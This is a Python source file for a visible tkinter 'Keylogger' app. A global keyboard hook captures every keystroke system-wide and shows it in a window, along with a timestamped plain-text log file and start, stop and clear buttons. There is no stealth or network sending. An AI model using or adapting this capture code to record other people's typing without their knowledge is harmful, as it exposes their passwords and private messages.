import tkinter as tk
from tkinter import scrolledtext, messagebox
import datetime
import keyboard

class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger")
        self.root.geometry("600x400")

        # Text area to display keystrokes
        self.log_area = scrolledtext.ScrolledText(self.root, width=60, height=20, wrap=tk.WORD)
        self.log_area.pack(pady=10)

        # Start button
        self.start_button = tk.Button(self.root, text="Start Logging", command=self.start_logging)
        self.start_button.pack(pady=5)

        # Stop button
        self.stop_button = tk.Button(self.root, text="Stop Logging", command=self.stop_logging, state=tk.DISABLED)
        self.stop_button.pack(pady=5)

        # Clear button
        self.clear_button = tk.Button(self.root, text="Clear Logs", command=self.clear_logs)
        self.clear_button.pack(pady=5)

        # Statistics label
        self.stats_label = tk.Label(self.root, text="Keystrokes logged: 0")
        self.stats_label.pack(pady=5)

        # File to store keystrokes
        self.log_file = "keystrokes.log"

        # Keyboard hook ID
        self.hook_id = None

        # Keystrokes counter
        self.keystrokes_count = 0

    def log_keystroke(self, event):
        key = event.name
        if len(key) > 1:
            if key == "space":
                key = " "
            elif key == "enter":
                key = "[ENTER]\n"
            elif key == "decimal":
                key = "."
            else:
                key = f"[{key}]"
        with open(self.log_file, "a") as f:
            f.write(f"{datetime.datetime.now()} : {key}\n")
        self.log_area.insert(tk.END, f"{datetime.datetime.now()} : {key}\n")
        self.log_area.see(tk.END)  # Scroll to the end
        self.keystrokes_count += 1
        self.stats_label.config(text=f"Keystrokes logged: {self.keystrokes_count}")

    def start_logging(self):
        if self.hook_id is None:
            self.hook_id = keyboard.on_release(self.log_keystroke)
            self.start_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.NORMAL)
            self.clear_button.config(state=tk.DISABLED)
            self.log_area.delete(1.0, tk.END)  # Clear previous logs
            self.keystrokes_count = 0
            self.stats_label.config(text="Keystrokes logged: 0")

    def stop_logging(self):
        if self.hook_id is not None:
            keyboard.unhook(self.hook_id)
            self.hook_id = None
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)
            self.clear_button.config(state=tk.NORMAL)

    def clear_logs(self):
        self.log_area.delete(1.0, tk.END)
        self.keystrokes_count = 0
        self.stats_label.config(text="Keystrokes logged: 0")
        if self.hook_id is None:
            with open(self.log_file, "w") as f:
                f.write("")

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerGUI(root)
    root.mainloop()
